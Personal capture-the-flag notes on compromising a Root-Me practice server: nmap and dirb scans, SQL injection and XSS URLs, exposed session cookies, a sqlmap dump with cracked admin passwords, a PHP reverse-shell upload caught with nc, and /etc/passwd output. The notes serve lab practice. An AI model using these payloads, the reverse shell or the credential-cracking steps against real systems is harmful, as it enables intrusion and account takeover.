@@ -1,0 +1,354 @@
+Ubuntu 8.04 LAMP
+time taken: soon...
+
+root@kali:~/ctf_shit# nmap -sV -A -O -T5 ctf01.root-me.org
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-19 21:21 MDT
+Nmap scan report for ctf01.root-me.org (212.129.28.18)
+Host is up (0.096s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 97:c2:94:f7:b8:a7:06:6d:04:e4:cf:b9:e5:35:7f:e9 (DSA)
+|_  2048 b4:3f:aa:69:48:90:27:4d:b7:1a:63:de:79:4c:ed:5d (RSA)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
+|_http-generator: TYPO3 4.2 CMS
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
+|_http-title: GreenPartner: Index
+Device type: general purpose|printer|bridge
+Running (JUST GUESSING): QEMU (94%), GNU Hurd (87%), HP embedded (86%), Minolta embedded (86%), NEC embedded (86%), Konica Minolta embedded (85%), Linux (85%), Oracle Virtualbox (85%)
+OS CPE: cpe:/a:qemu:qemu cpe:/o:gnu:hurd cpe:/h:konicaminolta:7035 cpe:/o:linux:linux_kernel:2.6.18 cpe:/o:oracle:virtualbox
+Aggressive OS guesses: QEMU user mode network gateway (94%), GNU Hurd 0.3 (87%), HP 9100c Digital Sender printer (J3113A) (86%), Minolta Di550 laser printer (86%), NEC SuperScript printer (86%), Konica Minolta 7035 printer (85%), Linux 2.6.18 (CentOS 5, x86_64, SMP) (85%), Oracle Virtualbox (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.29 ms 10.0.2.2
+2   0.28 ms ctf01.root-me.org (212.129.28.18)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.83 seconds
+
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.36 ms 10.0.2.2
+2   0.61 ms ctf01.root-me.org (212.129.28.18)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.98 seconds
+
+sqlmap shows nothing injectible in index.php?id=1$uid=1...
+
+http://ctf01.root-me.org/index.php?id=4&uid=-1%20or%201=1
+
+gives admin info,
+
+http://ctf01.root-me.org/index.php?id=4&uid=-1%20or%201=0 
+
+does not...
+
+http://ctf01.root-me.org/index.php?id=4&no_cache=0&uid=%3Ch1%3Ehello%3C/h1%3E
+
+--> lets us edit the document with whatever we want, text images, but for some reason not scripts...
+
+http://ctf01.root-me.org/index.php?id=4&no_cache=1&uid=%3CSCRIPT%20SRC=http://xss.rocks/xss.js%3E%3C/SCRIPT%3E
+
+this works, links to a test XSS site
+
+found cookie, also reachable via Tamper Data firefox plugin:
+
+fe_typo_user=4243d7df30731e59cdb7ca237647b21d
+
+useless, moving on:
+
+dirb:
+
+---- Scanning URL: http://ctf01.root-me.org/ ----
++ http://ctf01.root-me.org/cgi-bin/ (CODE:403|SIZE:333)                        
++ http://ctf01.root-me.org/ChangeLog (CODE:200|SIZE:399834)                    
++ http://ctf01.root-me.org/clear (CODE:200|SIZE:46)                            
+==> DIRECTORY: http://ctf01.root-me.org/content/                               
+==> DIRECTORY: http://ctf01.root-me.org/fileadmin/                             
++ http://ctf01.root-me.org/index (CODE:200|SIZE:3979)                          
++ http://ctf01.root-me.org/index.php (CODE:200|SIZE:3979)                      
++ http://ctf01.root-me.org/LICENSE (CODE:200|SIZE:843)                         
+==> DIRECTORY: http://ctf01.root-me.org/misc/                                  
++ http://ctf01.root-me.org/README (CODE:200|SIZE:7695)                         
++ http://ctf01.root-me.org/server-status (CODE:403|SIZE:338)                   
+==> DIRECTORY: http://ctf01.root-me.org/t3lib/                                 
+==> DIRECTORY: http://ctf01.root-me.org/tt/                                    
+==> DIRECTORY: http://ctf01.root-me.org/typo3/                                 
+==> DIRECTORY: http://ctf01.root-me.org/typo3conf/                             
+==> DIRECTORY: http://ctf01.root-me.org/typo3temp/                             
+==> DIRECTORY: http://ctf01.root-me.org/uploads/                               
+                                                                               
+---- Entering directory: http://ctf01.root-me.org/content/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://ctf01.root-me.org/fileadmin/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://ctf01.root-me.org/misc/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://ctf01.root-me.org/t3lib/ ----
+==> DIRECTORY: http://ctf01.root-me.org/t3lib/fonts/                           
++ http://ctf01.root-me.org/t3lib/index (CODE:200|SIZE:149)                     
++ http://ctf01.root-me.org/t3lib/index.html (CODE:200|SIZE:149)                
++ http://ctf01.root-me.org/t3lib/README (CODE:200|SIZE:376)                    
++ http://ctf01.root-me.org/t3lib/thumbs (CODE:200|SIZE:62)                     
+                                                                               
+---- Entering directory: http://ctf01.root-me.org/tt/ ----
+==> DIRECTORY: http://ctf01.root-me.org/tt/admin/                              
++ http://ctf01.root-me.org/tt/config (CODE:200|SIZE:0)                         
+==> DIRECTORY: http://ctf01.root-me.org/tt/doc/                                
+==> DIRECTORY: http://ctf01.root-me.org/tt/images/                             
++ http://ctf01.root-me.org/tt/include (CODE:200|SIZE:383)                      
++ http://ctf01.root-me.org/tt/index (CODE:302|SIZE:0)                          
++ http://ctf01.root-me.org/tt/index.php (CODE:302|SIZE:0)                      
+==> DIRECTORY: http://ctf01.root-me.org/tt/install/                            
+==> DIRECTORY: http://ctf01.root-me.org/tt/lib/                                
+==> DIRECTORY: http://ctf01.root-me.org/tt/modules/                            
+==> DIRECTORY: http://ctf01.root-me.org/tt/plugins/                            
++ http://ctf01.root-me.org/tt/preview (CODE:200|SIZE:0)                        
++ http://ctf01.root-me.org/tt/soap (CODE:302|SIZE:0)                           
++ http://ctf01.root-me.org/tt/stylesheet (CODE:200|SIZE:2535)                  
+==> DIRECTORY: http://ctf01.root-me.org/tt/tmp/                                
+==> DIRECTORY: http://ctf01.root-me.org/tt/uploads/                            
++ http://ctf01.root-me.org/tt/version (CODE:200|SIZE:0)                        
+                                                                               
+---- Entering directory: http://ctf01.root-me.org/typo3/ ----
++ http://ctf01.root-me.org/typo3/ajax (CODE:200|SIZE:1036)                     
++ http://ctf01.root-me.org/typo3/backend (CODE:200|SIZE:1036)                  
++ http://ctf01.root-me.org/typo3/browser (CODE:200|SIZE:1036)                  
+==> DIRECTORY: http://ctf01.root-me.org/typo3/classes/                         
++ http://ctf01.root-me.org/typo3/clear (CODE:200|SIZE:46)                      
++ http://ctf01.root-me.org/typo3/close (CODE:200|SIZE:730)                     
+==> DIRECTORY: http://ctf01.root-me.org/typo3/contrib/                         
+==> DIRECTORY: http://ctf01.root-me.org/typo3/css/                             
++ http://ctf01.root-me.org/typo3/default (CODE:200|SIZE:299)                   
+                                                                                                                                                                                                                                                                                                                                + http://ctf01.root-me.org/typo3/dummy (CODE:200|SIZE:1036)                    
+==> DIRECTORY: http://ctf01.root-me.org/typo3/ext/                             
+==> DIRECTORY: http://ctf01.root-me.org/typo3/gfx/                             
++ http://ctf01.root-me.org/typo3/index (CODE:200|SIZE:297)                     
++ http://ctf01.root-me.org/typo3/index.htm (CODE:200|SIZE:297)                 
++ http://ctf01.root-me.org/typo3/index.html (CODE:200|SIZE:298)                
++ http://ctf01.root-me.org/typo3/index.php (CODE:200|SIZE:5896)                
++ http://ctf01.root-me.org/typo3/init (CODE:200|SIZE:1036)                     
+==> DIRECTORY: http://ctf01.root-me.org/typo3/install/                         
+==> DIRECTORY: http://ctf01.root-me.org/typo3/js/                              
++ http://ctf01.root-me.org/typo3/LICENSE (CODE:200|SIZE:459)                   
++ http://ctf01.root-me.org/typo3/logout (CODE:200|SIZE:1036)                   
+==> DIRECTORY: http://ctf01.root-me.org/typo3/mod/                             
++ http://ctf01.root-me.org/typo3/README (CODE:200|SIZE:459)                    
++ http://ctf01.root-me.org/typo3/stylesheet (CODE:200|SIZE:46579)              
++ http://ctf01.root-me.org/typo3/template (CODE:200|SIZE:33)                   
+==> DIRECTORY: http://ctf01.root-me.org/typo3/templates/                       
++ http://ctf01.root-me.org/typo3/thumbs (CODE:200|SIZE:62)                     
+                                                                               
+---- Entering directory: http://ctf01.root-me.org/typo3conf/ ----
+==> DIRECTORY: http://ctf01.root-me.org/typo3conf/ext/                         
++ http://ctf01.root-me.org/typo3conf/index (CODE:200|SIZE:149)                 
++ http://ctf01.root-me.org/typo3conf/index.html (CODE:200|SIZE:149)            
+                                                                               
+---- Entering directory: http://ctf01.root-me.org/typo3temp/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://ctf01.root-me.org/uploads/ ----
++ http://ctf01.root-me.org/uploads/index (CODE:200|SIZE:149)                   
++ http://ctf01.root-me.org/uploads/index.html (CODE:200|SIZE:149)              
+^C> Testing: http://ctf01.root-me.org/uploads/m6_edit_item 
+
+a lot of these seem to redirect to the homepage
+
+http://ctf01.root-me.org/ChangeLog --> changelog which discloses emails/usernames, bug/vuln fixes,
+and typo3 version (4.2.14)
+
+http://ctf01.root-me.org/fileadmin/ --> shows user uploads and a temp folder.
+this could be where a web shell is placed...
+
+http://ctf01.root-me.org/misc/ --> or here. has "superadmin.php", which seems to do nothing yet
+
+
+http://ctf01.root-me.org/typo3temp/
+allows for sessions to be accessed...
+66b8473be4fcdcad02ceaa34af3f0b97
+	fe_typo_user=2c7981748a906af310d56a1b99d1a62a; PHPSESSID=109371b9c25dc922046c212314be3337; 		CMSSESSIDf3a5a9b2=5c34947c750f006bd8219c6a46cb4709;
+	be_typo_user=4eed6371b5d1f2ccd2105bf8e3ddd105
+
+f9bbdf493fee037226bf781242345de0
+	fe_typo_user=d65f978c4d27a01b9f91919405dd5744; PHPSESSID=109371b9c25dc922046c212314be3337; 		CMSSESSIDf3a5a9b2=5c34947c750f006bd8219c6a46cb4709; 				be_typo_user=03cdb03b2449afbe199af9b082d9ada9
+redirects to current session though
+
+http://ctf01.root-me.org/tt/install/ --> CMS made simple install
+
+uploading arbitrary file discloses webapp file structure on host:  /var/www/website/tt/ 
+
+going through the install shows a bunch of data:
+
+Server Software 	Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
+Server API 	apache2handler
+Server Operating System 	Linux 2.6.24-26-generic On i686
+Apache Mod Security 	Off 
+
+vmsplice may be useful for privesc later on once we have a shell
+
+-----------------------------45589136819429685211852077613\r\nContent-Disposition: form-data; name="cksumdat"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------45589136819429685211852077613\r\nContent-Disposition: form-data; name="page"\r\n\r\n2\r\n-----------------------------45589136819429685211852077613\r\nContent-Disposition: form-data; name="default_cms_lang"\r\n\r\nen_US\r\n-----------------------------45589136819429685211852077613--\r\n
+	
+
+http://ctf01.root-me.org/tt/admin/	
+Database Connection Failed
+Error: Access denied for user 'cms'@'localhost' (using password: YES) (1045)
+Function Performed: CONNECT
+Host/DB: localhost/cms
+Database Type: mysql
+
+hmmm...
+
+so database is called cms and is mysql
+
+bypassed check by changing page in Tamper data to 3!
+
+chaned file permissions to 755
+
+page 4 lets us make admin credentials!! 
+
+I set username to admin
+email: admin@nowhere.org
+password:admin
+page 5:
+site name: cmssite
+
+don't know mysql admin creds..shit
+neither is the admin pannel found on the server...maybe wview-source:http://ctf01.root-me.org/typo3/index.phpe're not supposed to get in this way
+
+http://ctf01.root-me.org/typo3/sysext/cms/ext_tables.sql -- looks important
+
+http://ctf01.root-me.org/typo3conf/ext/page_php_content/doc/wizard_form.html --> oooooo
+apparently the authors name is "Gary", email at gniemcew@yahoo.com
+
+
+http://ctf01.root-me.org/typo3/index.php --> admin login for typo3 cms.
+maybe try:
+
+sqlmap -u "http://ctf01.root-me.org/typo3/install/index.php" --cookie='be_typo_user=93681b30e4ff6e36c2ae6e2143888b1a; PHPSESSID=67b0a378b6b04c87e2e7766e254feb46' --data='login_status=login&username=admin&p_field=password&commandLI=Log+In&userident=82c734f68f0bc7f072ead9b06136b09c&challenge=a9ce338431caa906010775b2e4c61f4f&redirect_url=backend.php&loginRefresh=1&interface=backend' --dbms=mysql --dump, but
+page shows:
+The Install Tool is locked.
+
+sqlamp -u "http://ctf01.root-me.org/typo3/install/index.php"
+
+Fix: Create a file typo3conf/ENABLE_INSTALL_TOOL
+This file may simply be empty.
+
+For security reasons, it is highly recommended to rename
+or delete the file after the operation is finished.
+
+If the file is older than 1 hour TYPO3 has automatically
+deleted it, so it needs to be created again.
+
+ok let's try again
+
+
+http://ctf01.root-me.org/typo3/sysext/cms/web_info/class.tx_cms_webinfo.php --> file inclusion 
+error?
+http://ctf01.root-me.org/typo3/sysext/felogin/pi1/class.tx_felogin_pi1.php --> ditto
+
+cannot access http://ctf01.root-me.org/typo3conf/, even with tamper data
+
+
+SQLMAP TIME:
+a friend helped me identify the exact URL needed for sqlmap:
+
+root@kdog:~/ctf_shit/ubuntu_8.04# sqlmap -u 'http://ctf01.root-me.org/index.php?id=4&uid=-1%20OR%2017-7%3d10' --dbs --dump
+
+[02:43:49] [INFO] analyzing table dump for possible password hashes                                               
+[02:43:49] [INFO] recognized possible password hashes in column 'password'
+[02:43:49] [INFO] writing hashes to a temporary file '/tmp/sqlmaprTpU_99531/sqlmaphashes-W0rTRZ.txt' 
+do you want to crack them via a dictionary-based attack? [Y/n/q] y
+[02:43:52] [INFO] using hash method 'md5_generic_passwd'
+[02:43:52] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[02:43:54] [INFO] cracked password 'bhunji' for user 'admin'                                                      
+[02:43:56] [INFO] cracked password 'member1' for user 'member1'                                                   
+[02:44:00] [INFO] cracked password 'member2' for user 'member2'
+
+
+so admin creds for typo3 CMS:
+admin:bhunji
+
+wew
+
+after a LONG time, I figured out that a shell can be uploaded by altering the php
+code in one of the existing pages (Members), as it contains executable php code.
+replacing it with the oh so reliable php-reverse-shell did the trick
+
+so go to Page --> Members --> PHP Script and replace php with php-reverse-shell.php
+this CMS is revolting to look at.
+
+have listener waiting upon page inspection:
+
+root@kdog:~# nc -nvlp 32928
+listening on [any] 32928 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 47885
+Linux victime-laptop 2.6.24-26-generic #1 SMP Tue Dec 1 18:37:31 UTC 2009 i686 GNU/Linux
+ 11:06:00 up  1:55,  0 users,  load average: 0.16, 0.34, 0.39
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+s h e l l e d
+
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+hplip:x:104:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+gdm:x:106:114:Gnome Display Manager:/var/lib/gdm:/bin/false
+pulse:x:107:116:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+messagebus:x:108:119::/var/run/dbus:/bin/false
+avahi:x:109:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+polkituser:x:110:122:PolicyKit,,,:/var/run/PolicyKit:/bin/false
+haldaemon:x:111:123:Hardware abstraction layer,,,:/var/run/hald:/bin/false
+victime:x:1000:1000:victime,,,:/home/victime:/bin/bash
+mysql:x:112:125:MySQL Server,,,:/var/lib/mysql:/bin/false
+sshd:x:113:65534::/var/run/sshd:/usr/sbin/nologin
+test:x:1001:1001::/home/test:/bin/bash
+
+bunch of users here
+
+full nelson, half nelson, udev.sh, and vmsplice do not work fuuuuuu almost there 
+i'll come back to this tomorrow I'm so close
+
+
+
+
+
